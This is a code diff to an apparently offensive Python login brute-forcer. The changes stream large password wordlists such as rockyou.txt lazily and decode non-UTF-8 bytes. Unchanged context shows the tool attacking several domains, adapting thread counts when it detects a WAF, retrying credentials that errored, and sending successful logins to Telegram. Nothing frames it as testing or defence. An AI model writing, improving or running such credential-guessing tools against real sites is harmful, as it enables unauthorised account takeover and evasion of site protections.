@@ -132,17 +132,70 @@ def save_error(user: str, pwd: str, error: str):
         f.write(f"{user}:{pwd} | {error}\n")
 
 def read_list(path):
+    """
+    Read a list file robustly, handling non-UTF-8 byte sequences
+    (e.g. rockyou.txt contains some non-UTF-8 bytes).
+    Tries UTF-8 first, then latin-1, then UTF-8 with errors='ignore'.
+    Note: use stream_list for very large files.
+    """
     p = Path(path)
     if not p.exists():
         print(f"[!] Missing: {path}")
         return []
-    return [l.strip() for l in p.read_text().splitlines() if l.strip() and not l.startswith("#")]
+
+    raw = p.read_bytes()
+    try:
+        text = raw.decode("utf-8")
+    except UnicodeDecodeError:
+        try:
+            text = raw.decode("latin-1")
+        except Exception:
+            text = raw.decode("utf-8", errors="ignore")
+
+    return [
+        l.strip()
+        for l in text.splitlines()
+        if l.strip() and not l.startswith("#")
+    ]
+
+def stream_list(path):
+    """
+    Yield stripped, non-empty, non-comment lines from a file lazily.
+    Memory-safe for huge files like rockyou.txt.
+    """
+    p = Path(path)
+    if not p.exists():
+        return
+    with open(p, "rb") as f:
+        for line in f:
+            try:
+                s = line.decode("utf-8").strip()
+            except UnicodeDecodeError:
+                s = line.decode("latin-1").strip()
+            if s and not s.startswith("#"):
+                yield s
+
+def count_list_lines(path):
+    """Count valid lines in a file without loading it all into memory."""
+    p = Path(path)
+    if not p.exists():
+        return 0
+    count = 0
+    with open(p, "rb") as f:
+        for line in f:
+            try:
+                s = line.decode("utf-8").strip()
+            except UnicodeDecodeError:
+                s = line.decode("latin-1").strip()
+            if s and not s.startswith("#"):
+                count += 1
+    return count
 
 def read_errors():
     if not Path("ERRORS.txt").exists():
         return []
     creds = []
-    with open("ERRORS.txt", "r") as f:
+    with open("ERRORS.txt", "r", encoding="utf-8", errors="ignore") as f:
         for line in f:
             if ":" in line and "|" in line:
                 cred = line.split("|")[0].strip()
@@ -232,7 +285,7 @@ def try_cred(domain: str, user: str, pwd: str, args, session: requests.Session, 
 # ---------------------------
 # Brute Engine per Domain
 # ---------------------------
-def run_brute_on_domain(domain: str, users, passes, args, retry_mode=False, silent=False, threads=None):
+def run_brute_on_domain(domain: str, users, passes_path, args, retry_mode=False, silent=False, threads=None):
     global ERROR_CREDS
     ERROR_CREDS = []
     session = get_session()
@@ -299,10 +352,34 @@ def run_brute_on_domain(domain: str, users, passes, args, retry_mode=False, sile
             if not silent:
                 print(f"[!] WAF detected, using {threads} threads (--waf)")
 
-    source = read_errors() if retry_mode else [(u, p) for u in users for p in passes]
-    total = len(source)
-    if total == 0:
-        return False, waf_detected
+    # ---- Build credential source (lazy for normal mode, in-memory for retry) ----
+    if retry_mode:
+        source = read_errors()
+        total = len(source)
+        if total == 0:
+            session.close()
+            return False, waf_detected
+    else:
+        # Stream passwords lazily from file to avoid loading huge wordlists
+        # (e.g. rockyou.txt) into memory and to avoid building the full
+        # cartesian product in RAM.
+        if not Path(passes_path).exists():
+            if not silent:
+                print(f"[!] Missing password list: {passes_path}")
+            session.close()
+            return False, waf_detected
+
+        total = len(users) * count_list_lines(passes_path)
+        if total == 0:
+            session.close()
+            return False, waf_detected
+
+        def _cartesian_stream():
+            for u in users:
+                for p in stream_list(passes_path):
+                    yield u, p
+
+        source = _cartesian_stream()
 
     if not silent:
         print(f"[+] {'Retry' if retry_mode else 'Brute Force on'} {domain}: {total} attempts → {threads} threads")
@@ -322,10 +399,18 @@ def run_brute_on_domain(domain: str, users, passes, args, retry_mode=False, sile
 
     success_found = False
 
-    def cred_generator():
-        for u, p in source:
-            yield u, p
-            time.sleep(0.001)
+    # For retry mode source is a list, for normal mode it's a generator.
+    # Wrap both into a generator for uniform next() usage.
+    if isinstance(source, list):
+        def cred_generator():
+            for u, p in source:
+                yield u, p
+                time.sleep(0.001)
+    else:
+        def cred_generator():
+            for u, p in source:
+                yield u, p
+                time.sleep(0.001)
 
     gen = cred_generator()
     continue_flag = getattr(args, "continue", False)
@@ -374,7 +459,7 @@ def run_brute_on_domain(domain: str, users, passes, args, retry_mode=False, sile
                                 pass  # should not happen if TELEGRAM_SEND is True
                             else:
                                 print(f"[Telegram] ❌ {telegram_status}")
-                    
+
                     if not continue_flag:
                         # Cancel all running tasks
                         for f in futures:
@@ -482,11 +567,14 @@ def main():
         print("[!] Provide --domain or --domains")
         sys.exit(1)
 
-    # Load credentials for main brute (always use user/pass lists, not errors)
+    # Load usernames (usually small) and verify password list without loading it.
     users = read_list(args.users)
-    passes = read_list(args.passes)
-    if not users or not passes:
-        print("[!] Missing username or password lists.")
+    if not users:
+        print("[!] Missing or empty username list.")
+        sys.exit(1)
+
+    if not Path(args.passes).exists() or count_list_lines(args.passes) == 0:
+        print("[!] Missing or empty password list.")
         sys.exit(1)
 
     overall_success = False
@@ -494,7 +582,9 @@ def main():
         if idx > 0:
             print_separator()
 
-        success, waf_detected = run_brute_on_domain(domain, users, passes, args, retry_mode=False, silent=args.silent)
+        success, waf_detected = run_brute_on_domain(
+            domain, users, args.passes, args, retry_mode=False, silent=args.silent
+        )
         if success:
             overall_success = True
 
@@ -508,7 +598,10 @@ def main():
                 retry_threads = 10
                 if waf_detected and args.waf is not None:
                     retry_threads = args.waf
-                retry_success, _ = run_brute_on_domain(domain, [], [], args, retry_mode=True, silent=args.silent, threads=retry_threads)
+                retry_success, _ = run_brute_on_domain(
+                    domain, [], args.passes, args,
+                    retry_mode=True, silent=args.silent, threads=retry_threads
+                )
                 if retry_success:
                     overall_success = True
 
